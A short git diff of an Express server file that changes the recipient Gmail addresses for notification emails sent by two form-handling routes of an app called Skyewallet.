@@ -159,7 +159,7 @@ app.post('/skye-app', (req, res, next) => {
 
   const mail = {
       from: 'admin@growveonct.com',
-      to: 'ifestephenie@gmail.com',
+      to: 'skyewallet.nigeria@gmail.com',
       subject: 'New message from Skyewallet-app',
       html: content,
   }
@@ -190,7 +190,7 @@ app.post('/skyecore', (req, res, next) => {
 
   const mail = {
       from: 'admin@growveonct.com',
-      to: 'ifestephenie@gmail.com',
+      to: 'ibominstagram@gmail.com',
       subject: 'New message from Skyewalletcore',
       html: content,
   }
